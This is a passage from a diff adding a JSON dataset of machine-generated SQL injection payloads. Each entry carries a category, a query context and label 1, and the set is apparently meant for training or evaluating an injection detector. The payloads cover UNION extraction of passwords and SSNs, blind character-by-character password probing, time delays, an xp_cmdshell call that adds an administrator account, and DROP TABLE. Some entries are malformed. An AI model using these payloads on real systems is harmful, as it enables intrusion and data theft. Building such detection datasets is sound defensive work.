+    "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database() AND table_name != 'users') --",
+    "full_query": "SELECT * FROM users WHERE id = ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database() AND table_name != 'users') --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "user_lookup",
+    "payload": "'; DECLARE @a NVARCHAR(4000); SET @a = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); EXEC sp_executesql @a; --",
+    "full_query": "SELECT * FROM users WHERE id = '; DECLARE @a NVARCHAR(4000); SET @a = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); EXEC sp_executesql @a; --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "user_lookup",
+    "payload": "' AND 1 = CONVERT(INT, 0x4E4F5F4E4F4F4E4F4F4F4F4F4F4F4F4F4F4F4F)",
+    "full_query": "SELECT * FROM users WHERE id = ' AND 1 = CONVERT(INT, 0x4E4F5F4E4F4F4E4F4F4F4F4F4F4F4F4F4F4F4F)",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "user_lookup",
+    "payload": "' AND (SELECT CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101) FROM DUAL)",
+    "full_query": "SELECT * FROM users WHERE id = ' AND (SELECT CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101) FROM DUAL)",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "user_lookup",
+    "payload": "'; WAITFOR DELAY '0:0:5'; SELECT username, password FROM admin_table; --",
+    "full_query": "SELECT * FROM users WHERE id = '; WAITFOR DELAY '0:0:5'; SELECT username, password FROM admin_table; --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "'; UNION SELECT username, password FROM users --",
+    "full_query": "SELECT * FROM orders WHERE status = ''; UNION SELECT username, password FROM users --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "''\"; WAITFOR DELAY '0:0:5' AND 1=1--",
+    "full_query": "SELECT * FROM orders WHERE status = '''\"; WAITFOR DELAY '0:0:5' AND 1=1--' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "') OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%')--",
+    "full_query": "SELECT * FROM orders WHERE status = '') OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%')--' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "--' UNION SELECT email, phone FROM customers --",
+    "full_query": "SELECT * FROM orders WHERE status = '--' UNION SELECT email, phone FROM customers --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "' OR '1'='1'/*\" UNION SELECT address, city FROM shipping_details */",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR '1'='1'/*\" UNION SELECT address, city FROM shipping_details */' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "(CASE WHEN (SELECT COUNT(*) FROM products) > 0 THEN CONCAT('admin',':','password') ELSE 'invalid' END) /**/",
+    "full_query": "SELECT * FROM orders WHERE status = '(CASE WHEN (SELECT COUNT(*) FROM products) > 0 THEN CONCAT('admin',':','password') ELSE 'invalid' END) /**/' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "/**/' UNION SELECT SSN, DOB FROM identity_info --",
+    "full_query": "SELECT * FROM orders WHERE status = '/**/' UNION SELECT SSN, DOB FROM identity_info --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "; --' UNION SELECT name, email FROM employees; --",
+    "full_query": "SELECT * FROM orders WHERE status = '; --' UNION SELECT name, email FROM employees; --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "'; WAITFOR DELAY '0:0:5' AND (SELECT 1 AS result FROM system_tables)",
+    "full_query": "SELECT * FROM orders WHERE status = ''; WAITFOR DELAY '0:0:5' AND (SELECT 1 AS result FROM system_tables)' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "--' UNION SELECT hostname, IP FROM network_configurations; --",
+    "full_query": "SELECT * FROM orders WHERE status = '--' UNION SELECT hostname, IP FROM network_configurations; --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "order_filter",
+    "payload": "'); EXECUTE master..xp_cmdshell 'net user administrator /add'; --",
+    "full_query": "SELECT * FROM orders WHERE status = ''); EXECUTE master..xp_cmdshell 'net user administrator /add'; --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "comment_insert",
+    "payload": "IF(COUNT(*) > 0, (SELECT password FROM users WHERE username='admin'), NULL) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, 'IF(COUNT(*) > 0, (SELECT password FROM users WHERE username='admin'), NULL) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "comment_insert",
+    "payload": "1' AND '1'=(SELECT CAST(ascii(SUBSTRING((SELECT TOP 1 password FROM users ORDER BY user_id), 1, 1)) AS VARCHAR)--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '1' AND '1'=(SELECT CAST(ascii(SUBSTRING((SELECT TOP 1 password FROM users ORDER BY user_id), 1, 1)) AS VARCHAR)--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "comment_insert",
+    "payload": "1' UNION ALL SELECT (SELECT title FROM posts WHERE post_id<10 LIMIT 1) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '1' UNION ALL SELECT (SELECT title FROM posts WHERE post_id<10 LIMIT 1) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "comment_insert",
+    "payload": "-- UNION SELECT u.id, CONCAT(u.username, ':', h.password) FROM users u JOIN hashes h ON u.id = h.user_id --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '-- UNION SELECT u.id, CONCAT(u.username, ':', h.password) FROM users u JOIN hashes h ON u.id = h.user_id --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "comment_insert",
+    "payload": "'; SELECT id, email FROM users /*",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, ''; SELECT id, email FROM users /*')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "comment_insert",
+    "payload": "' OR EXISTS(SELECT 1 FROM employees WHERE department = 'HR') --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM employees WHERE department = 'HR') --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "comment_insert",
+    "payload": "\"; SELECT title FROM blog_posts WHERE author_id = (SELECT id FROM authors WHERE name LIKE '%BlogAdmin%') --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '\"; SELECT title FROM blog_posts WHERE author_id = (SELECT id FROM authors WHERE name LIKE '%BlogAdmin%') --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "login",
+    "payload": "%\" OR (SELECT 1 FROM information_schema.tables WHERE table_name='users')--",
+    "full_query": "SELECT * FROM users WHERE username = '%\" OR (SELECT 1 FROM information_schema.tables WHERE table_name='users')--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "login",
+    "payload": "' OR ASCII(SUBSTRING(password,1,1)) = 97 --",
+    "full_query": "SELECT * FROM users WHERE username = '' OR ASCII(SUBSTRING(password,1,1)) = 97 --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "login",
+    "payload": "1' OR 1=(SELECT 1 FROM (SELECT * FROM users LIMIT 1) WHERE 1) --",
+    "full_query": "SELECT * FROM users WHERE username = '1' OR 1=(SELECT 1 FROM (SELECT * FROM users LIMIT 1) WHERE 1) --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "login",
+    "payload": "--' OR (SELECT 1 FROM users WHERE username LIKE 'admin%')--",
+    "full_query": "SELECT * FROM users WHERE username = '--' OR (SELECT 1 FROM users WHERE username LIKE 'admin%')--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "login",
+    "payload": "' OR (LENGTH(username) > 5 AND EXISTS(SELECT 1 FROM users WHERE username = 'admin'))--",
+    "full_query": "SELECT * FROM users WHERE username = '' OR (LENGTH(username) > 5 AND EXISTS(SELECT 1 FROM users WHERE username = 'admin'))--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "login",
+    "payload": "1' OR SUBSTR(username, 1, 1) = 'a' AND SUBSTR(password, 1, 1) = 'a' --",
+    "full_query": "SELECT * FROM users WHERE username = '1' OR SUBSTR(username, 1, 1) = 'a' AND SUBSTR(password, 1, 1) = 'a' --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "login",
+    "payload": "1' OR 1=1 OR username LIKE '%admin%' AND password='any' --",
+    "full_query": "SELECT * FROM users WHERE username = '1' OR 1=1 OR username LIKE '%admin%' AND password='any' --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "1' AND (SELECT NULL FROM information_schema.tables WHERE table_name LIKE '%users%') IS NULL--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND (SELECT NULL FROM information_schema.tables WHERE table_name LIKE '%users%') IS NULL--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "1' AND 1=(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97) THEN 1 ELSE 0 END)--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND 1=(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97) THEN 1 ELSE 0 END)--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "1' AND EXISTS(SELECT 1 FROM users WHERE id=1 AND ASCII(SUBSTRING(username,1,1)) BETWEEN ASCII('a') AND ASCII('z'))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND EXISTS(SELECT 1 FROM users WHERE id=1 AND ASCII(SUBSTRING(username,1,1)) BETWEEN ASCII('a') AND ASCII('z'))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "1' AND 1=(SELECT 1 FROM users WHERE id=1 AND name LIKE CONCAT('%',(CHAR(97)),'%'))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND 1=(SELECT 1 FROM users WHERE id=1 AND name LIKE CONCAT('%',(CHAR(97)),'%'))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "1' AND 1 IN (SELECT 1 FROM users WHERE id=1 AND SUBSTRING(name,1,1)=CHAR(97))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND 1 IN (SELECT 1 FROM users WHERE id=1 AND SUBSTRING(name,1,1)=CHAR(97))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "1' AND (SELECT CAST(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1 LIMIT 1),1,1)) AS CHAR) = 'a'--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND (SELECT CAST(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1 LIMIT 1),1,1)) AS CHAR) = 'a'--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "--' AND (SELECT 0 FROM product_info WHERE price > (SELECT AVG(price) FROM products)) --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%--' AND (SELECT 0 FROM product_info WHERE price > (SELECT AVG(price) FROM products)) --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "/*' AND 1=2 UNION SELECT NULL,NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='store_db'),NULL--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%/*' AND 1=2 UNION SELECT NULL,NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='store_db'),NULL--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "' AND ascii(substring((SELECT group_concat(password) FROM user_accounts),1,1))>97--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND ascii(substring((SELECT group_concat(password) FROM user_accounts),1,1))>97--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "%' AND EXISTS(SELECT 1 FROM inventory WHERE item_id LIKE concat('%', (CHAR(98)), '%'))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%' AND EXISTS(SELECT 1 FROM inventory WHERE item_id LIKE concat('%', (CHAR(98)), '%'))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "search",
+    "payload": "' AND (SELECT cast(ascii(substring((SELECT product_code FROM orders WHERE order_id=1),1,1)) AS char)=char(99)--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND (SELECT cast(ascii(substring((SELECT product_code FROM orders WHERE order_id=1),1,1)) AS char)=char(99)--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "--' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')--",
+    "full_query": "SELECT * FROM users WHERE id = --' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "'; WAITFOR DELAY '0:0:10' AND 1=1; --",
+    "full_query": "SELECT * FROM users WHERE id = '; WAITFOR DELAY '0:0:10' AND 1=1; --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "--' AND (SELECT CASE WHEN 1=1 THEN CAST(ASCII((SELECT username FROM users WHERE id=1)) AS VARCHAR) ELSE NULL END)='",
+    "full_query": "SELECT * FROM users WHERE id = --' AND (SELECT CASE WHEN 1=1 THEN CAST(ASCII((SELECT username FROM users WHERE id=1)) AS VARCHAR) ELSE NULL END)='",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "' OR 1=1 AND EXISTS(SELECT 1 FROM users WHERE id=(SELECT IF(SUBSTRING(username, 1, 1)='a', 1, 0)))--",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 1=1 AND EXISTS(SELECT 1 FROM users WHERE id=(SELECT IF(SUBSTRING(username, 1, 1)='a', 1, 0)))--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "%' AND (SELECT COUNT(*) FROM users WHERE id IN (SELECT id FROM users WHERE username COLLATE utf8mb4_bin LIKE 'a%')) > 0 --",
+    "full_query": "SELECT * FROM users WHERE id = %' AND (SELECT COUNT(*) FROM users WHERE id IN (SELECT id FROM users WHERE username COLLATE utf8mb4_bin LIKE 'a%')) > 0 --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "' AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(username ORDER BY id), 1, 1)) & 0x80 > 0 --",
+    "full_query": "SELECT * FROM users WHERE id = ' AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(username ORDER BY id), 1, 1)) & 0x80 > 0 --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "--' AND (SELECT ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) & 0x80 > 0",
+    "full_query": "SELECT * FROM users WHERE id = --' AND (SELECT ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) & 0x80 > 0",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "' OR 1=1 AND SUBSTR((SELECT password FROM users WHERE id=1), 1, 1)='a'",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 1=1 AND SUBSTR((SELECT password FROM users WHERE id=1), 1, 1)='a'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "--' AND (SELECT COUNT(*) FROM users WHERE username LIKE '_%' AND LENGTH(username)=2)>0",
+    "full_query": "SELECT * FROM users WHERE id = --' AND (SELECT COUNT(*) FROM users WHERE username LIKE '_%' AND LENGTH(username)=2)>0",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "--' AND (SELECT ASCII(SUBSTRING((SELECT CONCAT(id, username) FROM users WHERE id=1), 1, 1)) & 0x80 > 0",
+    "full_query": "SELECT * FROM users WHERE id = --' AND (SELECT ASCII(SUBSTRING((SELECT CONCAT(id, username) FROM users WHERE id=1), 1, 1)) & 0x80 > 0",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "user_lookup",
+    "payload": "' AND (SELECT IF(SUM(CASE WHEN username LIKE 'admin%' THEN 1 ELSE 0 END), 'true', 'false') FROM users)='true'",
+    "full_query": "SELECT * FROM users WHERE id = ' AND (SELECT IF(SUM(CASE WHEN username LIKE 'admin%' THEN 1 ELSE 0 END), 'true', 'false') FROM users)='true'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "1; WAITFOR DELAY '0:0:5';--",
+    "full_query": "SELECT * FROM orders WHERE status = '1; WAITFOR DELAY '0:0:5';--' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "1' LIKE '1'%",
+    "full_query": "SELECT * FROM orders WHERE status = '1' LIKE '1'%' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "/*'*/AND 1=1 /*comment*/",
+    "full_query": "SELECT * FROM orders WHERE status = '/*'*/AND 1=1 /*comment*/' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "' AND 1=1 OR 1=1 --",
+    "full_query": "SELECT * FROM orders WHERE status = '' AND 1=1 OR 1=1 --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "' AND (SELECT 1 FROM users WHERE username = '') = 1",
+    "full_query": "SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM users WHERE username = '') = 1' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "' AND 1<>(CASE WHEN (SELECT COUNT(*) FROM users WHERE id = 1) THEN 1 ELSE 0 END) --",
+    "full_query": "SELECT * FROM orders WHERE status = '' AND 1<>(CASE WHEN (SELECT COUNT(*) FROM users WHERE id = 1) THEN 1 ELSE 0 END) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "' LIKE '%admin%'",
+    "full_query": "SELECT * FROM orders WHERE status = '' LIKE '%admin%'' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "/*'*/ AND 1=1 /*comment*/",
+    "full_query": "SELECT * FROM orders WHERE status = '/*'*/ AND 1=1 /*comment*/' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "AND EXISTS(SELECT * FROM users WHERE status = 'active') --",
+    "full_query": "SELECT * FROM orders WHERE status = 'AND EXISTS(SELECT * FROM users WHERE status = 'active') --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "order_filter",
+    "payload": "OR (SELECT 1 UNION ALL SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) = 'admin' THEN 1 ELSE 0 END)",
+    "full_query": "SELECT * FROM orders WHERE status = 'OR (SELECT 1 UNION ALL SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) = 'admin' THEN 1 ELSE 0 END)' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "comment_insert",
+    "payload": "[\";--\", \"--;\", \"\"\"', 1)\", \"/*'\"]), (\"1'/*\", \"1'))\"), (\"1'#\", \";--\"), (\"1' OR '1'='1\", \"--;\"], (\"1'; DROP TABLE users --\", \"1') UNION SELECT NULL, NULL--\")]",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '[\";--\", \"--;\", \"\"\"', 1)\", \"/*'\"]), (\"1'/*\", \"1'))\"), (\"1'#\", \";--\"), (\"1' OR '1'='1\", \"--;\"], (\"1'; DROP TABLE users --\", \"1') UNION SELECT NULL, NULL--\")]')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "comment_insert",
+    "payload": "1' AND EXISTS (SELECT * FROM users WHERE 1=1)",
